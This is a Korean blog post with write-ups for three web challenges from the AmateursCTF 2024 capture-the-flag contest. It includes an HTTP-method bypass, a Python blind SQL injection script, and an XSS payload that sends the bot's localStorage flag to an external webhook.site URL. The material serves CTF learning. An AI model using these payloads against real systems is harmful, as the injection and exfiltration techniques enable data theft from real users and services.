---
layout: post
title: AmateursCTF 2024
description: CTF Write-up
tags: AmateursCTF 
category: ctf
---
      
### CTFtime: https://ctftime.org/event/2226            
### Official URL: https://ctf.amateurs.team/	    
       
# Team Score	    
     
<img src="/assets/images/ctf/2024/amateurs/score.jpg" width="700px"/>    
     
대회 당시 웹 문제는 총 3문제를 풀었고, 나머지 웹 문제들은 대회 이후 다시 풀어보고 Writeup을 작성했다.   
        
## Writeup    

- <a href="#denied">denied</a>     
<!-- - <a href="#agile-rut">agile-rut</a>      -->
- <a href="#one-shot">one-shot</a>      
- <a href="#sculpture">sculpture</a>    
          
<!-- - <a href="#creative-login-page-challenge">creative-login-page-challenge</a>
- <a href="#busy-bee">busy-bee</a>       
- <a href="#lahoot-async">lahoot-async</a>            -->

<a id="denied"></a>   
       
# denied       
      
856 solves / 53 points        

```javascript
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```           
      
GET 요청 외에 다른 요청을 보내면 플래그를 획득할 수 있다.     
             
```bash
$ curl -X OPTIONS -i http://denied.amt.rs/

HTTP/1.1 200 OK
Allow: GET,HEAD
Content-Length: 8
Content-Type: text/html; charset=utf-8
Date: Wed, 10 Apr 2024 03:38:32 GMT
Etag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
Server: Caddy
X-Powered-By: Express

GET,HEAD
```      
`OPTIONS` 요청을 통해 서버가 어떤 요청을 지원하는지 알 수 있다.    

### Exploit Code 
```bash
curl -X HEAD -i http://denied.amt.rs/ 

HTTP/1.1 200 OK
Content-Length: 7
Content-Type: text/html; charset=utf-8
Date: Fri, 05 Apr 2024 15:49:06 GMT
Etag: W/"7-skdQAtrqJAsgWjDuibJaiRXqV44"
Server: Caddy
Set-Cookie: flag=amateursCTF%7Bs0_m%40ny_0ptions...%7D; Path=/
X-Powered-By: Express
```             
       
### Flag     
amateursCTF{s0_m@ny_0ptions...}

<!-- # agile-rut       
      
311 solves / 173 points    -->
           


# one-shot   

282 solves / 184 points   
               
```python
@app.route("/search", methods=["POST"])
def search():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    searched = db.execute(f"SELECT searched FROM table_{id}").fetchone()[0]
    if searched:
        return "you've used your shot."
    
    db.execute(f"UPDATE table_{id} SET searched = 1")

    query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
    return f"""
    <h2>Your results:</h2>
    <ul>
    {"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
    </ul>
    <h3>Ready to make your guess?</h3>
    <form action="/guess" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="password" placehoder="Password">
        <input type="submit" value="Guess">
    </form>
"""
```        
       
`query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")` 쿼리문에서 SQL Injection 취약점이 발생한다. `UPDATE table_{id} SET searched = 1` 쿼리에 의해 같은 `id` 값으로는 `/search` 경로에 접근이 한 번만 가능하다.    

하지만, 접근 횟수 문제는 `/new_session`을 통해 새로운 `id` 값을 받아주면 된다. Injection Query에서 `table_{id}` 값을 지정해주면 패스워드를 알아낼 수 있다.        
                    
### Exploit Code 
```python
import requests 

url = "http://one-shot.amt.rs"

s = requests.Session() 

chars = "1234567890abcdef"
pw = ""
for i in range(32):
    for c in chars: 
        r = s.post(f"{url}/new_session") 
        id = r.text[r.text.find("id")+24:r.text.find("id")+40]
        qry = f"' AND (SELECT password FROM table_2f78e058112a0008 WHERE password LIKE '{pw + c}%') AND password LIKE '%"
        print(qry)
        r = s.post(f"{url}/search", 
                    data={
                        "id": f"{id}",
                        "query": qry
                    })
        if "*" in r.text:
            pw += c
            print(pw)

# FLAG 
url = "http://one-shot.amt.rs"
r = requests.post(f"{url}/guess", 
                  data={
                      "id":"2f78e058112a0008",
                      "password": pw
                  })
print(r.text)
```       
<img src="/assets/images/ctf/2024/amateurs/one-shot/flag.jpg" width="700px">     
       
### Flag            
amateursCTF{go_union_select_a_life}       

# sculpture        
              
95 solves / 302 points 
      
```javascript
// bot powered by the redpwn admin bot ofc
['sculpture', {
    name: 'sculpture',
    timeout: 10000,
    handler: async (url, ctx) => {
      const page = await ctx.newPage()
      console.log(await page.browser().version());
      await page.goto("https://amateurs-ctf-2024-sculpture-challenge.pages.dev/", { timeout: 3000, waitUntil: 'domcontentloaded' })
      await sleep(1000);
      await page.evaluate(() => {
        localStorage.setItem("flag", "amateursCTF{fak3_flag}")
      })
      await sleep(1000);
      console.log("going to " + url)
      await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' })
      await sleep(1000)
    },
    urlRegex: /^https:\/\/amateurs-ctf-2024-sculpture-challenge\.pages\.dev/,
}]
```
봇이 가진 `localStorage` 값을 읽으면 플래그를 획득할 수 있다.        
       
```javascript 
function outf(text) { 
    var mypre = document.getElementById("output"); 
    mypre.innerHTML = mypre.innerHTML + text; 
} 
function builtinRead(x) {
    if (Sk.builtinFiles === undefined || Sk.builtinFiles["files"][x] === undefined)
            throw "File not found: '" + x + "'";
    return Sk.builtinFiles["files"][x];
}

// Here's everything you need to run a python program in skulpt
// grab the code from your textarea
// get a reference to your pre element for output
// configure the output function
// call Sk.importMainWithBody()
function runit() { 
   var prog = document.getElementById("yourcode").value; 
   var mypre = document.getElementById("output"); 
   mypre.innerHTML = ''; 
   Sk.pre = "output";
   Sk.configure({output:outf, read:builtinRead}); 
   (Sk.TurtleGraphics || (Sk.TurtleGraphics = {})).target = 'mycanvas';
   var myPromise = Sk.misceval.asyncToPromise(function() {
       return Sk.importMainWithBody("<stdin>", false, prog, true);
   });
   myPromise.then(function(mod) {
       console.log('success');
   },
       function(err) {
       console.log(err.toString());
   });
}

document.addEventListener("DOMContentLoaded",function(ev){
    document.getElementById("yourcode").value = atob((new URLSearchParams(location.search)).get("code"));
    runit();
});
```       
위 코드는 파이썬 코드를 입력하면 결과 값을 출력한다. `outf()`에서 `innerHTML`을 사용하고 어떠한 필터링이 걸려있지 않다.    
즉, `XSS` 취약점이 존재하여 `localStorage.getItem('flag')` 값을 웹훅으로 넘기면 된다.     
          
<img src="/assets/images/ctf/2024/amateurs/sculpture/alert.jpg" width="700px">            
          
XSS 취약점을 통해 `alert(1)`이 잘 출력되는 것을 확인할 수 있다. 
                         
### Exploit Code 
```python
# https://amateurs-ctf-2024-sculpture-challenge.pages.dev/?code=cHJpbnQoIjxpbWcgc3JjPXggb25lcnJvcj1sb2NhdGlvbi5ocmVmPWBodHRwczovL3dlYmhvb2suc2l0ZS80Zjg1OGVhMS03YjFkLTRlNjAtYmUxNi01Mzk0YTZhYTY3M2EvP2M9YCtsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnZmxhZycpPiIp
print("<img src=x onerror=location.href=`https://webhook.site/4f858ea1-7b1d-4e60-be16-5394a6aa673a/?c=`+localStorage.getItem('flag')>")
```               
             
<img src="/assets/images/ctf/2024/amateurs/sculpture/flag.jpg" width="700px">           
            
### Flag     
amateursCTF{i_l0v3_wh3n_y0u_can_imp0rt_xss_v3ct0r}          
                             
<!-- # creative-login-page-challenge        
              
20 solves / 427 points         

# busy-bee            
              
4 solves / 485 points   

# lahoot-async        
              
3 solves / 490 points    -->